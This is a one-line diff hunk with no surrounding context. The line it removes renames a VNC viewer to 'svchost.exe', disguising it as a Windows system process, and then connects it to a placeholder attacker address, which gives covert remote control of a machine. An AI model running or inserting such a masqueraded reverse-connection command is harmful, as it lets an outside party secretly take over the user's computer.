@@ -1,1 +1,0 @@
-move vncviewer.exe svchost.exe && ./svchost.exe -connect attacker_ip::5500
